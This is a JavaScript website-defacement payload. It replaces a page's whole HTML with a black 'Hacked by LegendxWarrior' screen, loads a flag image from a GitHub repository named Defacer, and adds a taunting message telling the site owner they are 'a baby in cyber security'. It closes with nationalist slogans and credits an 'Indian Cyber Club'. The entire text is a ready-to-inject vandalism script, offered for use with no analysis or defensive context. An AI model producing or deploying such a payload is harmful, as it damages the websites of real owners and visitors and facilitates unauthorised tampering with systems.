document.querySelector("html").innerHTML = `
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Marmelad&display=swap" rel="stylesheet">
  <title>Hacked by Legend</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      width: 100%;
      background: #000;
      font-family: 'Marmelad', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 5vh 5vw;
      color: white;
      text-align: center;
    }

    .Main {
      color: #FF0000;
      font-size: 3.5vw;
      animation: main-anim 15s infinite;
    }

    .wish {
      color: #FFF2F2;
      font-size: 6vw;
      margin-top: 4vh;
      animation: wish-anim 10s infinite;
    }

    img {
      margin-top: 5vh;
      max-width: 90%;
      height: auto;
    }

    p {
  font-size: 5.5vw;
  margin-top: 4vh;
  background: linear-gradient(180deg, red, white, green);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  color: transparent;
}

@media (min-width: 768px) {
p {
  font-size: 1.5rem;
}
.show, .about {
  font-size: 1.2rem;
}
}

    ..show {
  margin-top: 5vh;
  font-size: 3.5vw; /* was 4vw */
  color: red;
}

.about {
  color: #FF8F04;
  font-size: 3.8vw; /* was 4.5vw */
  margin-top: auto;
}

    @keyframes main-anim {
      0% {
        text-shadow: none;
      }
      50% {
        text-shadow:
          -2px -2px 0px #000000,
          2px 2px 0px #000000,
          2px -2px 0px #000,
          -2px 2px 0px #000,
          15px 15px 15px #FF0000,
          -15px 15px 15px #FF0000,
          15px -15px 20px #FF0000,
          -15px -15px 30px #FF0000;
      }
    }

    @keyframes wish-anim {
      0% {
        text-shadow: 0px;
      }
      30% {
        color: #00FF01;
        text-shadow:
          -6px -6px 0px #000000,
          -2px 2px 0px #000000,
          2px -2px 0px #000000,
          2px 2px 0px #000000,
          15px 15px 15px #FF0000,
          -15px 15px 15px #FF0000,
          15px -15px 20px #FF4600,
          -15px -15px 30px #FF4600;
      }
      50% {
        text-shadow: none;
      }
      80% {
        color: #FF5000;
        text-shadow:
          -2px -2px 0px #000000,
          -2px 2px 0px #000000,
          2px -2px 0px #000000,
          6px 4px 0px #000000,
          15px 15px 15px #00ff3c,
          -15px 15px 15px #00FF3C,
          15px -15px 20px #00ff3c,
          -15px -15px 30px #00ff3c;
      }
      100% {
        text-shadow: 0px;
      }
    }

    @media (min-width: 768px) {
      .Main {
        font-size: 2.5rem;
      }

      .wish {
        font-size: 3rem;
      }

      p, .show, .about {
        font-size: 1.2rem;
      }
    }
  </style>
</head>
<body>
  <h1 class="Main">[+] Hacked by LegendxWarrior [+]</h1>
  <h1 class="wish"><strong>[ Happy Independence Day ]</strong></h1>
  <img src="https://raw.githubusercontent.com/legendxWarrior/Defacer/main/flag.jpg" alt="Flag">
  <p>I find vulnerability and just compromised your system. You need to know more about security because you are a baby in cyber security. I laugh on your security that is compromised by a beginner hacker. I am an Indian and I just hacked your website to wish the Independence Day of India.</p>
  <div class="show">
    <h2>{ धर्मो रक्षति रक्षितः }<br>|| भारत माता की जय ||<br>🚩जय श्री राम 🚩<br>⚔️⚔️⚔️</h2>
  </div>
  <div class="about">
    <h1>[•]&nbsp;&nbsp;Legend&nbsp;&nbsp;[•]</h1>
    <h1>#Team ICC(<span style="color:red">Indian Cyber Club</span>)</h1>
  </div>
</body>
`;
